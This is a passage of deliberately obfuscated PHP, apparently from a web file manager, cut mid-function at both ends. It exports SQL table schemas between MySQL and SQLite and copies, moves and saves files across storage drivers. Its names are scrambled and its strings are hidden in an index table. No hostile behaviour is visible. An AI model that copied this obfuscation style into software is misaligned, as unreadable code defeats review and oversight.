$ºˆŸ–õØ = $this->sqlFromSqlite($ã¿üäàÚ); if (!$ºˆŸ–õØ[$›è‘ﬂ––[13]]) { continue; } fwrite($√ŒªØ¶„, $ºˆŸ–õØ[$›è‘ﬂ––[13]] . PHP_EOL . PHP_EOL); if (!in_array($ã¿üäàÚ, $ ê”Åıø)) { fwrite($ïÈ £‹á, $ºˆŸ–õØ[$›è‘ﬂ––[877]] . PHP_EOL . PHP_EOL); } } } else { foreach ($√Ò€Ó˝Æ as $ã¿üäàÚ) { $ºˆŸ–õØ = $this->sqlFromMysql($ã¿üäàÚ); if (!$ºˆŸ–õØ[$›è‘ﬂ––[877]]) { continue; } fwrite($ïÈ £‹á, $ºˆŸ–õØ[$›è‘ﬂ––[877]] . PHP_EOL . PHP_EOL); if (!in_array($ã¿üäàÚ, $ ê”Åıø)) { fwrite($√ŒªØ¶„, $ºˆŸ–õØ[$›è‘ﬂ––[13]] . PHP_EOL . PHP_EOL); } } } fclose($ïÈ £‹á); fclose($√ŒªØ¶„); $Ä‹º∞ª≠ = array($›è‘ﬂ––[877] => $Î“‡óùá, $›è‘ﬂ––[13] => $Ãª¸Ôëé); return $æ≤Óÿ·Ó ? $Ä‹º∞ª≠[$æ≤Óÿ·Ó] : $Ä‹º∞ª≠; } public function dbType($Ω”ØÙº∞ = false) { $ÉÉ∞Ü÷µ =& $_SERVER[ß⁄ˆÇ†Œ]; $•´±Ù±± = $Ω”ØÙº∞ ? $GLOBALS[$ÉÉ∞Ü÷µ[6]][$ÉÉ∞Ü÷µ[21]] : $this->database; $•´±Ù±± = array_change_key_case($•´±Ù±±); $âœóÓ÷¶ = $•´±Ù±±[$ÉÉ∞Ü÷µ[1041]]; if ($âœóÓ÷¶ == $ÉÉ∞Ü÷µ[1038]) { $ëÿŒ≥ΩÛ = explode($ÉÉ∞Ü÷µ[4], $•´±Ù±±[$ÉÉ∞Ü÷µ[1047]]); $âœóÓ÷¶ = $ëÿŒ≥ΩÛ[0]; } $∆„—ã≠å = array($ÉÉ∞Ü÷µ[1172] => $ÉÉ∞Ü÷µ[13], $ÉÉ∞Ü÷µ[986] => $ÉÉ∞Ü÷µ[877]); if (isset($∆„—ã≠å[$âœóÓ÷¶])) { $âœóÓ÷¶ = $∆„—ã≠å[$âœóÓ÷¶]; } return $âœóÓ÷¶; } public function sqlFromMysql($∞çÀÊ∆–, $ò¸˙˚Öô = '') { $µΩå˝ªﬂ =& $_SERVER[ß⁄ˆÇ†Œ]; $ÙÙûÇ‹ü = $this->model()->db(); $ô‡À–∑“ = $ÙÙûÇ‹ü->query($µΩå˝ªﬂ[1173] . $∞çÀÊ∆– . $µΩå˝ªﬂ[469]); if (!$ô‡À–∑“ || !$ô‡À–∑“[0]) { return !1; } $°∞¶µÉÚ = _get($ô‡À–∑“[0], $µΩå˝ªﬂ[1174], $µΩå˝ªﬂ[12]); if (!$°∞¶µÉÚ) { return !1; } $ü‚ˆ†‚ê = "\x44\x52\117\x50\x20\x54\101\x42\114\x45\x20\x49\x46\x20\x45\x58\111\123\124\123\x20\140{$∞çÀÊ∆–}\140\x3b" . PHP_EOL . $°∞¶µÉÚ . $µΩå˝ªﬂ[74]; if ($ò¸˙˚Öô && $ò¸˙˚Öô == $µΩå˝ªﬂ[877]) { return $ü‚ˆ†‚ê; } $¡ƒúﬁÉŸ = array_change_key_case($GLOBALS[$µΩå˝ªﬂ[6]][$µΩå˝ªﬂ[21]]); $«˜ÑîèØ = $¡ƒúﬁÉŸ[$µΩå˝ªﬂ[1046]]; $¬–äê¥À = $µΩå˝ªﬂ[1175] . $«˜ÑîèØ . $µΩå˝ªﬂ[1176] . $∞çÀÊ∆– . $µΩå˝ªﬂ[58]; $˚¡¨ãêØ = $µΩå˝ªﬂ[1177] . $∞çÀÊ∆– . $µΩå˝ªﬂ[974]; $˚¶Û∞Í¡ = $ÙÙûÇ‹ü->query($¬–äê¥À); if (empty($˚¶Û∞Í¡)) { $¢çèÌπÁ = array($µΩå˝ªﬂ[877] => $µΩå˝ªﬂ[12], $µΩå˝ªﬂ[13] => $µΩå˝ªﬂ[12]); return $ò¸˙˚Öô ? $¢çèÌπÁ[$ò¸˙˚Öô] : $¢çèÌπÁ; } $πÒÅ„‹∞ = $ÙÙûÇ‹ü->query($˚¡¨ãêØ); $øñßâÅä = $µΩå˝ªﬂ[12]; $≥õ—£á◊ = array(); foreach ($πÒÅ„‹∞ as $∆ÿÙÓóÀ) { if (!$øñßâÅä && $∆ÿÙÓóÀ[$µΩå˝ªﬂ[1178]] == $µΩå˝ªﬂ[1179]) { $øñßâÅä = $∆ÿÙÓóÀ[$µΩå˝ªﬂ[1180]]; } if (isset($≥õ—£á◊[$∆ÿÙÓóÀ[$µΩå˝ªﬂ[1178]]])) { $≥õ—£á◊[$∆ÿÙÓóÀ[$µΩå˝ªﬂ[1178]]][$µΩå˝ªﬂ[1181]][] = $∆ÿÙÓóÀ[$µΩå˝ªﬂ[1180]]; continue; } $≥õ—£á◊[$∆ÿÙÓóÀ[$µΩå˝ªﬂ[1178]]] = array($µΩå˝ªﬂ[1182] => $∆ÿÙÓóÀ[$µΩå˝ªﬂ[1178]], $µΩå˝ªﬂ[1181] => array($∆ÿÙÓóÀ[$µΩå˝ªﬂ[1180]]), $µΩå˝ªﬂ[1183] => $∆ÿÙÓóÀ[$µΩå˝ªﬂ[1184]] == $µΩå˝ªﬂ[91] ? 0 : 1); } $øó⁄†¨â = array(); foreach ($≥õ—£á◊ as $∆ÿÙÓóÀ) { $˘«ºîµÛ = $∆ÿÙÓóÀ[$µΩå˝ªﬂ[1182]] == $µΩå˝ªﬂ[1179]; $÷è∏§œ˜ = array($µΩå˝ªﬂ[1185], $∆ÿÙÓóÀ[$µΩå˝ªﬂ[1183]] == $µΩå˝ªﬂ[91] && !$˘«ºîµÛ ? $µΩå˝ªﬂ[1186] : $µΩå˝ªﬂ[12], $µΩå˝ªﬂ[1187], $µΩå˝ªﬂ[1188] . $∞çÀÊ∆– . $µΩå˝ªﬂ[11] . ($˘«ºîµÛ ? $µΩå˝ªﬂ[1189] : $∆ÿÙÓóÀ[$µΩå˝ªﬂ[1182]]) . $µΩå˝ªﬂ[121], $µΩå˝ªﬂ[1190], $µΩå˝ªﬂ[121] . $∞çÀÊ∆– . $µΩå˝ªﬂ[121], $µΩå˝ªﬂ[1191] . implode($µΩå˝ªﬂ[1192], $∆ÿÙÓóÀ[$µΩå˝ªﬂ[1181]]) . $µΩå˝ªﬂ[1193]); $øó⁄†¨â[] = implode($µΩå˝ªﬂ[53], $÷è∏§œ˜) . $µΩå˝ªﬂ[74]; } $±¯„‰˛† = array(); $“òêßÍ¬ = array($µΩå˝ªﬂ[1194] => $µΩå˝ªﬂ[1195], $µΩå˝ªﬂ[1195] => $µΩå˝ªﬂ[1195], $µΩå˝ªﬂ[373] => $µΩå˝ªﬂ[400], $µΩå˝ªﬂ[372] => $µΩå˝ªﬂ[400]); foreach ($˚¶Û∞Í¡ as $∆ÿÙÓóÀ) { $÷è∏§œ˜ = array($µΩå˝ªﬂ[121] . $∆ÿÙÓóÀ[$µΩå˝ªﬂ[1196]] . $µΩå˝ªﬂ[121], isset($“òêßÍ¬[$∆ÿÙÓóÀ[$µΩå˝ªﬂ[1197]]]) ? $“òêßÍ¬[$∆ÿÙÓóÀ[$µΩå˝ªﬂ[1197]]] : $∆ÿÙÓóÀ[$µΩå˝ªﬂ[1198]], $∆ÿÙÓóÀ[$µΩå˝ªﬂ[1199]] == $µΩå˝ªﬂ[972] ? $µΩå˝ªﬂ[1200] : $µΩå˝ªﬂ[1201], $∆ÿÙÓóÀ[$µΩå˝ªﬂ[1196]] == $øñßâÅä ? $µΩå˝ªﬂ[1202] : $µΩå˝ªﬂ[12], $∆ÿÙÓóÀ[$µΩå˝ªﬂ[1023]] ? strtoupper(str_replace($µΩå˝ªﬂ[11], $µΩå˝ªﬂ[12], $∆ÿÙÓóÀ[$µΩå˝ªﬂ[1023]])) : $µΩå˝ªﬂ[12]); $±¯„‰˛†[] = trim(implode($µΩå˝ªﬂ[53], $÷è∏§œ˜)); } $’œË¥πñ = array($µΩå˝ªﬂ[1203] . $∞çÀÊ∆– . $µΩå˝ªﬂ[1204], $µΩå˝ªﬂ[1205] . $∞çÀÊ∆– . $µΩå˝ªﬂ[1206], implode($µΩå˝ªﬂ[50] . PHP_EOL, $±¯„‰˛†), $µΩå˝ªﬂ[1020]); $¯ì–˛∆∑ = implode(PHP_EOL, array_merge($’œË¥πñ, $øó⁄†¨â)); if ($ò¸˙˚Öô && $ò¸˙˚Öô == $µΩå˝ªﬂ[13]) { return $¯ì–˛∆∑; } $¢çèÌπÁ = array($µΩå˝ªﬂ[877] => $ü‚ˆ†‚ê, $µΩå˝ªﬂ[13] => $¯ì–˛∆∑); return $ò¸˙˚Öô ? $¢çèÌπÁ[$ò¸˙˚Öô] : $¢çèÌπÁ; } public function sqlFromSqlite($ÿñÄıﬂ‘, $∂Ò—“Êå = '') { $ØñÛ≥∂ã =& $_SERVER[ß⁄ˆÇ†Œ]; $ç•Û§§ç = $this->model()->db(); $∏À¢éõÒ = "\x50\x52\101\107\115\101\x20\x54\x41\102\x4c\105\137\x49\116\x46\x4f\40\x28\x27{$ÿñÄıﬂ‘}\47\x29"; $ä‚ïôŸë = "\123\x45\x4c\105\103\124\x20\52\x20\106\x52\x4f\x4d\x20\163\x71\x6c\x69\x74\145\137\155\x61\163\164\x65\162\40\127\110\105\x52\x45\40\164\142\x6c\137\156\x61\155\x65\40\75\x20\x27{$ÿñÄıﬂ‘}\x27"; $±ø´ÙÂ˘ = $ç•Û§§ç->query($∏À¢éõÒ); if (empty($±ø´ÙÂ˘)) { $îîúá…∂ = array($ØñÛ≥∂ã[877] => $ØñÛ≥∂ã[12], $ØñÛ≥∂ã[13] => $ØñÛ≥∂ã[12]); return $∂Ò—“Êå ? $îîúá…∂[$∂Ò—“Êå] : $îîúá…∂; } $›Œ≈ﬂÒ€ = $ç•Û§§ç->query($ä‚ïôŸë); $æπ¢ŸôÚ = $ã∂∞∞˝¬ = array(); foreach ($›Œ≈ﬂÒ€ as $ˆﬁ≈œô») { if ($ˆﬁ≈œô»[$ØñÛ≥∂ã[33]] == $ØñÛ≥∂ã[365]) { $æπ¢ŸôÚ[] = $ˆﬁ≈œô»[$ØñÛ≥∂ã[1207]]; } else { $ã∂∞∞˝¬[$ˆﬁ≈œô»[$ØñÛ≥∂ã[32]]] = $ˆﬁ≈œô»[$ØñÛ≥∂ã[1207]]; } } $Ÿ¯ö˚Àº = array_merge(array($ØñÛ≥∂ã[1203] . $ÿñÄıﬂ‘ . $ØñÛ≥∂ã[121]), $æπ¢ŸôÚ, array_values($ã∂∞∞˝¬)); $Ÿ¯ö˚Àº = implode($ØñÛ≥∂ã[74] . PHP_EOL, $Ÿ¯ö˚Àº) . $ØñÛ≥∂ã[74]; if ($∂Ò—“Êå && $∂Ò—“Êå == $ØñÛ≥∂ã[13]) { return $Ÿ¯ö˚Àº; } $ÿ»Õ∆∆¿ = array(); $ÀÈ›ÄÔú = array($ØñÛ≥∂ã[1195] => $ØñÛ≥∂ã[1208], $ØñÛ≥∂ã[400] => $ØñÛ≥∂ã[1209]); $ÈôâÊ‰Á = $ØñÛ≥∂ã[12]; foreach ($±ø´ÙÂ˘ as $ˆﬁ≈œô») { if ($ˆﬁ≈œô»[$ØñÛ≥∂ã[57]] == $ØñÛ≥∂ã[91]) { $ÈôâÊ‰Á = $ˆﬁ≈œô»[$ØñÛ≥∂ã[32]]; } $¸“ÇœÃﬂ = array($ØñÛ≥∂ã[469] . $ˆﬁ≈œô»[$ØñÛ≥∂ã[32]] . $ØñÛ≥∂ã[469], isset($ÀÈ›ÄÔú[$ˆﬁ≈œô»[$ØñÛ≥∂ã[33]]]) ? $ÀÈ›ÄÔú[$ˆﬁ≈œô»[$ØñÛ≥∂ã[33]]] : $ˆﬁ≈œô»[$ØñÛ≥∂ã[33]], $ˆﬁ≈œô»[$ØñÛ≥∂ã[35]] == $ØñÛ≥∂ã[91] ? $ØñÛ≥∂ã[1200] : $ØñÛ≥∂ã[1210] . $ˆﬁ≈œô»[$ØñÛ≥∂ã[56]], $ˆﬁ≈œô»[$ØñÛ≥∂ã[57]] == $ØñÛ≥∂ã[91] ? $ØñÛ≥∂ã[1211] : $ØñÛ≥∂ã[12]); $ÿ»Õ∆∆¿[] = trim(implode($ØñÛ≥∂ã[53], $¸“ÇœÃﬂ)); } foreach ($ã∂∞∞˝¬ as $∂‘∆¯“© => $úù÷ éó) { $≈˜Û¢˜Ú = str_replace($ØñÛ≥∂ã[1212] . $ÿñÄıﬂ‘ . $ØñÛ≥∂ã[11], $ØñÛ≥∂ã[12], $∂‘∆¯“©); $ﬁ˚‚‰é = str_replace(array($ØñÛ≥∂ã[121], $ØñÛ≥∂ã[1031]), $ØñÛ≥∂ã[469], substr($úù÷ éó, stripos($úù÷ éó, $ØñÛ≥∂ã[346]))); if ($≈˜Û¢˜Ú == $ØñÛ≥∂ã[1189]) { $ï‘Ô˚ûÖ = $ØñÛ≥∂ã[1213] . $ÈôâÊ‰Á . $ØñÛ≥∂ã[1214]; } else { $ï‘Ô˚ûÖ = (stripos($≈˜Û¢˜Ú, $ØñÛ≥∂ã[11]) ? $ØñÛ≥∂ã[1215] : $ØñÛ≥∂ã[12]) . ($ØñÛ≥∂ã[1216] . $≈˜Û¢˜Ú . $ØñÛ≥∂ã[1217] . $ﬁ˚‚‰é); } $ÿ»Õ∆∆¿[] = $ï‘Ô˚ûÖ; } $‰∆¯π˙∞ = array($ØñÛ≥∂ã[1218] . $ÿñÄıﬂ‘ . $ØñÛ≥∂ã[1219], $ØñÛ≥∂ã[1220] . $ÿñÄıﬂ‘ . $ØñÛ≥∂ã[1221], implode($ØñÛ≥∂ã[50] . PHP_EOL, $ÿ»Õ∆∆¿), $ØñÛ≥∂ã[1222]); $¥öõíû∫ = implode(PHP_EOL, $‰∆¯π˙∞); if ($∂Ò—“Êå && $∂Ò—“Êå == $ØñÛ≥∂ã[877]) { return $¥öõíû∫; } $îîúá…∂ = array($ØñÛ≥∂ã[877] => $¥öõíû∫, $ØñÛ≥∂ã[13] => $Ÿ¯ö˚Àº); return $∂Ò—“Êå ? $îîúá…∂[$∂Ò—“Êå] : $îîúá…∂; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($˛˙–Íî›, $∆ìÛ∏—›) { $⁄≠±∫ìà =& $_SERVER[ß⁄ˆÇ†Œ]; $ñË”ìØ˛ = $∆ìÛ∏—›; $GLOBALS[$⁄≠±∫ìà[1223]] = $⁄≠±∫ìà[1224] . $˛˙–Íî›; Hook::trigger($⁄≠±∫ìà[1224] . $˛˙–Íî› . $⁄≠±∫ìà[1225], $ñË”ìØ˛); $¶äãﬂ˝˘ = self::driverMake($∆ìÛ∏—›[0]); if (!$¶äãﬂ˝˘) { return !1; } if (method_exists($¶äãﬂ˝˘, $˛˙–Íî›)) { $îÂ¨ úô = @call_user_func_array(array($¶äãﬂ˝˘, $˛˙–Íî›), $∆ìÛ∏—›); } else { if (method_exists($¶äãﬂ˝˘, $⁄≠±∫ìà[1226])) { $îÂ¨ úô = @call_user_func_array(array($¶äãﬂ˝˘, $˛˙–Íî›), $∆ìÛ∏—›); } else { if (method_exists(self, $˛˙–Íî›)) { $îÂ¨ úô = @call_user_func_array(array(self, $˛˙–Íî›), $∆ìÛ∏—›); } else { $îÂ¨ úô = call_user_func_array(array(parent, $˛˙–Íî›), $∆ìÛ∏—›); } } } Hook::trigger($⁄≠±∫ìà[1224] . $˛˙–Íî› . $⁄≠±∫ìà[1227], $ñË”ìØ˛, $îÂ¨ úô); return $îÂ¨ úô; } public static function init($º€’Õ≈’) { return self::driverMake($º€’Õ≈’); } public static function copy($”Ô¢ç÷é, $Îî√ùß¸, $ˆÊ◊’ï€ = false, $§Œ≥ﬁÕÕ = false) { return self::copyMoveStart($”Ô¢ç÷é, $Îî√ùß¸, $ˆÊ◊’ï€, $_SERVER[ß⁄ˆÇ†Œ][626], $§Œ≥ﬁÕÕ); } public static function move($◊Ù‡ÛÑµ, $Î¸⁄—ã©, $•±—˙Êâ = false, $Üï∂ÁΩ« = false) { return self::copyMoveStart($◊Ù‡ÛÑµ, $Î¸⁄—ã©, $•±—˙Êâ, $_SERVER[ß⁄ˆÇ†Œ][628], $Üï∂ÁΩ«); } private static function copyMoveStart($˜Ê∫©æÈ, $˚Ì°Ä‚Å, $”çΩÊŸﬂ, $≠∂˝∂ÅÛ, $ÅÏÔøñï) { $óŸ—Ãµﬁ =& $_SERVER[ß⁄ˆÇ†Œ]; $ã€éÙƒø = array($˜Ê∫©æÈ, $˚Ì°Ä‚Å, $”çΩÊŸﬂ, $ÅÏÔøñï); Hook::trigger($óŸ—Ãµﬁ[1224] . $≠∂˝∂ÅÛ . $óŸ—Ãµﬁ[1225], $ã€éÙƒø); $üÑ»Ûîß = self::copyMove($˜Ê∫©æÈ, $˚Ì°Ä‚Å, $”çΩÊŸﬂ, $≠∂˝∂ÅÛ, $ÅÏÔøñï); Hook::trigger($óŸ—Ãµﬁ[1224] . $≠∂˝∂ÅÛ . $óŸ—Ãµﬁ[1227], $ã€éÙƒø, $üÑ»Ûîß); return $üÑ»Ûîß; } public static function saveFile($ÛÔ◊òÈ€, $Úû˜œ¸Ê, $ã¿∫•í˘ = true) { $°ûÖì˜§ =& $_SERVER[ß⁄ˆÇ†Œ]; $Í”Ú…ºÚ = self::info($Úû˜œ¸Ê); $‘À‰ﬂƒÙ = self::driverMake($ÛÔ◊òÈ€); $±Êî∂Å = self::driverMake($Úû˜œ¸Ê); $©úŒˆ·Î = !1; if ($±Êî∂Å->pathParse[$°ûÖì˜§[1228]]) { $©úŒˆ·Î = $±Êî∂Å; $÷⁄˚°Öé = $±Êî∂Å->pathParse[$°ûÖì˜§[1228]]; $±Êî∂Å = self::driverMake($÷⁄˚°Öé); } if ($‘À‰ﬂƒÙ->pathParse[$°ûÖì˜§[1228]]) { $ﬁµΩùÿÑ = $‘À‰ﬂƒÙ->pathParse[$°ûÖì˜§[1228]]; $‘À‰ﬂƒÙ = self::driverMake($ﬁµΩùÿÑ); } $á˙Ì·œÁ = $±Êî∂Å->pathFather($Úû˜œ¸Ê); $ê§¶ÿ≈˘ = !0; if (!$ã¿∫•í˘ && self::driverIsSame($‘À‰ﬂƒÙ, $±Êî∂Å)) { $ê§¶ÿ≈˘ = !1; } $î€«Ü˝‰ = self::copyFile($‘À‰ﬂƒÙ, $ÛÔ◊òÈ€, $±Êî∂Å, $á˙Ì·œÁ, $Í”Ú…ºÚ[$°ûÖì˜§[32]], $ê§¶ÿ≈˘); if ($©úŒˆ·Î) { $î€«Ü˝‰ = $©úŒˆ·Î->getPathOuter($î€«Ü˝‰); } return $î€«Ü˝‰; } private static function copyMove($í≥˛—¬ , $Œ™ßŸÎÇ, $Ôπ∑Ωª, $∞¨è¶æã, $·êçŒõ = false) { $ì˝∫«ÅÀ =& $_SERVER[ß⁄ˆÇ†Œ]; if (!$í≥˛—¬  || $í≥˛—¬  == $ì˝∫«ÅÀ[8] || !$Œ™ßŸÎÇ) { return !1; } ignore_timeout(); $∞—¡ÈÖÀ = self::driverMake($í≥˛—¬ ); $ï§Ä˝…‰ = self::driverMake($Œ™ßŸÎÇ); $œê≤È‰± = $∞¨è¶æã == $ì˝∫«ÅÀ[628]; $üÆèﬂœ» = !1; if ($ï§Ä˝…‰->pathParse[$ì˝∫«ÅÀ[1228]]) { $üÆèﬂœ» = $ï§Ä˝…‰; $Œ™ßŸÎÇ = $ï§Ä˝…‰->pathParse[$ì˝∫«ÅÀ[1228]]; $ï§Ä˝…‰ = self::driverMake($Œ™ßŸÎÇ); } if ($∞—¡ÈÖÀ->pathParse[$ì˝∫«ÅÀ[1228]]) { $í≥˛—¬  = $∞—¡ÈÖÀ->pathParse[$ì˝∫«ÅÀ[1228]]; $∞—¡ÈÖÀ = self::driverMake($í≥˛—¬ ); } self::check($∞—¡ÈÖÀ, $í≥˛—¬ , $ï§Ä˝…‰, $Œ™ßŸÎÇ); Hook::trigger($ì˝∫«ÅÀ[1229], $∞—¡ÈÖÀ, $í≥˛—¬ , $ï§Ä˝…‰, $Œ™ßŸÎÇ); $æôéµû⁄ = self::driverIsSame($∞—¡ÈÖÀ, $ï§Ä˝…‰); if ($æôéµû⁄) { if ($∞¨è¶æã == $ì˝∫«ÅÀ[628] && !method_exists($ï§Ä˝…‰, $ì˝∫«ÅÀ[1230]) && trim($Œ™ßŸÎÇ, $ì˝∫«ÅÀ[8]) == trim($ï§Ä˝…‰->pathFather($í≥˛—¬ ), $ì˝∫«ÅÀ[8])) { if ($∞—¡ÈÖÀ->pathThis($í≥˛—¬ ) != $·êçŒõ && !$∞—¡ÈÖÀ->isOsDriver()) { return $∞—¡ÈÖÀ->rename($í≥˛—¬ , $·êçŒõ); } return $ï§Ä˝…‰->getPathOuter($í≥˛—¬ ); } if (method_exists($ï§Ä˝…‰, $∞¨è¶æã)) { return $ï§Ä˝…‰->{$∞¨è¶æã}($í≥˛—¬ , $Œ™ßŸÎÇ, $Ôπ∑Ωª, $·êçŒõ); } } if ($æôéµû⁄ && $∞¨è¶æã == $ì˝∫«ÅÀ[628] && $ï§Ä˝…‰->getType() == $ì˝∫«ÅÀ[109]) { $Ç¢‘ëﬁ‡ = $ï§Ä˝…‰->movePath($í≥˛—¬ , $Œ™ßŸÎÇ, $·êçŒõ); if ($Ç¢‘ëﬁ‡) { return $Ç¢‘ëﬁ‡; } } $˝ôÌÊ∞É = $∞—¡ÈÖÀ->isFile($í≥˛—¬ ); if (!$˝ôÌÊ∞É && $ï§Ä˝…‰->getType() == $ì˝∫«ÅÀ[830] && $∞—¡ÈÖÀ->getType() == $ì˝∫«ÅÀ[109]) { $Ç¢‘ëﬁ‡ = $ï§Ä˝…‰->copyFolderFromIO($∞—¡ÈÖÀ, $í≥˛—¬ , $Œ™ßŸÎÇ, $Ôπ∑Ωª, $œê≤È‰±, $·êçŒõ); } else { $Ç¢‘ëﬁ‡ = self::copyPath($∞—¡ÈÖÀ, $í≥˛—¬ , $ï§Ä˝…‰, $Œ™ßŸÎÇ, $Ôπ∑Ωª, $œê≤È‰±, $˝ôÌÊ∞É, $·êçŒõ); } if ($Ç¢‘ëﬁ‡ && $œê≤È‰±) { $∞—¡ÈÖÀ->remove($í≥˛—¬ ); } if ($üÆèﬂœ») { $Ç¢‘ëﬁ‡ = $üÆèﬂœ»->getPathOuter($Ç¢‘ëﬁ‡); } return $Ç¢‘ëﬁ‡; } private static function check($‘«…˛®∏, $ÏÚ» Õ¶, $›µô¢óÒ, &$Ú•îØ°˘) { $’›ù÷±Ø =& $_SERVER[ß⁄ˆÇ†Œ]; if (self::driverIsSame($‘«…˛®∏, $›µô¢óÒ) && $‘«…˛®∏->isFolder($ÏÚ» Õ¶) && $‘«…˛®∏->isParentOf($ÏÚ» Õ¶, $Ú•îØ°˘)) { show_json(LNG($’›ù÷±Ø[1231]), !1); } if (!$‘«…˛®∏->exist($ÏÚ» Õ¶)) { show_json(LNG($’›ù÷±Ø[108]), !1); } } private static function copyPath($Â»Œ¥©Ù, $˘ﬁÖ„˛ü, $Âàƒò…≥, $Ã”Ωπº¢, $å¡Ïö’, $∞’®ü÷æ, $±Ôë˜Ãª, $¯â⁄“’ﬁ = false, $Ωπ…œó¯ = true) { $«»ÈµãÆ =& $_SERVER[ß⁄ˆÇ†Œ]; $Á±ºƒÔÊ = empty($¯â⁄“’ﬁ) && $¯â⁄“’ﬁ !== $«»ÈµãÆ[228] ? $Â»Œ¥©Ù->pathThis($˘ﬁÖ„˛ü) : $¯â⁄“’ﬁ; if ($å¡Ïö’) { $¸Œß¸Ÿ€ = $Âàƒò…≥->fileNameExist($Ã”Ωπº¢, $Á±ºƒÔÊ); $“ö§ÿºÅ = $Á±ºƒÔÊ; $Á±ºƒÔÊ = $Âàƒò…≥->fileNameAuto($Ã”Ωπº¢, $Á±ºƒÔÊ, $å¡Ïö’, !$±Ôë˜Ãª); if (!$¸Œß¸Ÿ€ || $“ö§ÿºÅ != $Á±ºƒÔÊ) { $å¡Ïö’ = !1; } if ($Ωπ…œó¯ && !$å¡Ïö’) { $Âàƒò…≥->_data[$«»ÈµãÆ[1232]] = !0; } } if ($±Ôë˜Ãª) { return self::copyFile($Â»Œ¥©Ù, $˘ﬁÖ„˛ü, $Âàƒò…≥, $Ã”Ωπº¢, $Á±ºƒÔÊ, $∞’®ü÷æ); } if ($å¡Ïö’ == REPEAT_RENAME_FOLDER) { $å¡Ïö’ = !1; } $œõ•˛§Ñ = rtrim($Ã”Ωπº¢, $«»ÈµãÆ[8]) . $«»ÈµãÆ[8] . $Á±ºƒÔÊ; $≠∫Òë¯Ø = $Âàƒò…≥->mkdir($Âàƒò…≥->getPath($œõ•˛§Ñ), $å¡Ïö’); $Ã”Ωπº¢ = $Âàƒò…≥->getPathInner($≠∫Òë¯Ø); $úÕÄø˝Ÿ = $Â»Œ¥©Ù->listPath($˘ﬁÖ„˛ü, !0); $úÕÄø˝Ÿ = is_array($úÕÄø˝Ÿ) ? $úÕÄø˝Ÿ : array($«»ÈµãÆ[86] => array(), $«»ÈµãÆ[85] => array()); $©ô•§Î‚ = array_merge($úÕÄø˝Ÿ[$«»ÈµãÆ[86]], $úÕÄø˝Ÿ[$«»ÈµãÆ[85]]); foreach ($©ô•§Î‚ as $üÅÆû«ù) { $‹ñ–π”à = $üÅÆû«ù[$«»ÈµãÆ[33]] == $«»ÈµãÆ[230]; $˘ﬁÖ„˛ü = $Â»Œ¥©Ù->getPathInner($üÅÆû«ù[$«»ÈµãÆ[87]]); $”∞√è√Å = self::copyPath($Â»Œ¥©Ù, $˘ﬁÖ„˛ü, $Âàƒò…≥, $Ã”Ωπº¢, $å¡Ïö’, $∞’®ü÷æ, $‹ñ–π”à, !1, !1); if (!$”∞√è√Å) { IO::errorTips($«»ÈµãÆ[1233] . $˘ﬁÖ„˛ü . $«»ÈµãÆ[73] . $Ã”Ωπº¢); } } self::copyMoveKeepInfo($Â»Œ¥©Ù, $˘ﬁÖ„˛ü, $≠∫Òë¯Ø); return $≠∫Òë¯Ø; } private static function copyFile($û≠√ä‘È, $ßΩ◊¯«æ, $òÌ¿Åú, $„äíÏë‰, $«˚ª°Æñ, $Û–πÏ™) { $Ö°î°˙  =& $_SERVER[ß⁄ˆÇ†Œ]; $„äíÏë‰ = $òÌ¿Åú->getPath(rtrim($„äíÏë‰, $Ö°î°˙ [8]) . $Ö°î°˙ [8] . $«˚ª°Æñ); $ î˝öÕÍ = $Ö°î°˙ [1234] . time() . rand_string(5); Hook::trigger($Ö°î°˙ [1235], $û≠√ä‘È, $ßΩ◊¯«æ, $òÌ¿Åú, $„äíÏë‰, $«˚ª°Æñ, $ î˝öÕÍ); if (self::driverIsSame($û≠√ä‘È, $òÌ¿Åú)) { if ($Û–πÏ™) { $‚ÎÂ÷í‘ = $òÌ¿Åú->moveFile($ßΩ◊¯«æ, $„äíÏë‰); } else { $‚ÎÂ÷í‘ = $òÌ¿Åú->copyFile($ßΩ◊¯«æ, $„äíÏë‰); } Hook::trigger($Ö°î°˙ [1236], $û≠√ä‘È, $ßΩ◊¯«æ, $òÌ¿Åú, $„äíÏë‰, $«˚ª°Æñ, $‚ÎÂ÷í‘); self::copyMoveKeepInfo($û≠√ä‘È, $ßΩ◊¯«æ, $‚ÎÂ÷í‘); return $‚ÎÂ÷í‘; } $†Ó·ﬂ•Ò = TEMP_FILES; if ($GLOBALS[$Ö°î°˙ [6]][$Ö°î°˙ [92]][$Ö°î°˙ [869]]) { $†Ó·ﬂ•Ò = $GLOBALS[$Ö°î°˙ [6]][$Ö°î°˙ [92]][$Ö°î°˙ [869]]; } $ÅÓïñ¿ç = $†Ó·ﬂ•Ò; mk_dir($ÅÓïñ¿ç); $Ûµ∞€÷â = $ÅÓïñ¿ç . $ î˝öÕÍ; $Ïı‡ò˝¡ = $Ûµ∞€÷â; $Ûµ∞€÷â = $û≠√ä‘È->download($ßΩ◊¯«æ, $Ûµ∞€÷â); $Ûµ∞€÷â = $û≠√ä‘È->iconvApp($Ûµ∞€÷â); if (substr($Ûµ∞€÷â, strlen($†Ó·ﬂ•Ò)) == $†Ó·ﬂ•Ò) { $Û–πÏ™ = !0; } $‚ÎÂ÷í‘ = $òÌ¿Åú->upload($„äíÏë‰, $Ûµ∞€÷â, $Û–πÏ™); self::remove($Ïı‡ò˝¡); Hook::trigger($Ö°î°˙ [1236], $û≠√ä‘È, $ßΩ◊¯«æ, $òÌ¿Åú, $„äíÏë‰, $«˚ª°Æñ, $‚ÎÂ÷í‘); self::copyMoveKeepInfo($û≠√ä‘È, $ßΩ◊¯«æ, $‚ÎÂ÷í‘); return $‚ÎÂ÷í‘; } private static function copyMoveKeepInfo($ÌëÛß¨π, $„’Í••º, $í¿‚‘⁄á) { if (!$í¿‚‘⁄á) { return; } $≥íû¸Ωâ = $ÌëÛß¨π->info($„’Í••º); if (!is_array($≥íû¸Ωâ)) { return; } IO::setModifyTime($í¿‚‘⁄á, $≥íû¸Ωâ[$_SERVER[ß⁄ˆÇ†Œ][88]]); } public static function pathFather($√«Ω˝Ó») { $œÓãéö¬ = IO::init($√«Ω˝Ó»); $Óá¥‡¸œ = $œÓãéö¬->pathFather($œÓãéö¬->path); return $œÓãéö¬->getPathOuter($Óá¥‡¸œ); } public static function fileOut($áªóÌ∂é, $ë†àÉ°˜ = false, $ÄÜ¬¸ı√ = false, $ÑÖ‹˙Ü¡ = '') { $î±ºßôÄ = self::driverMake($áªóÌ∂é); if 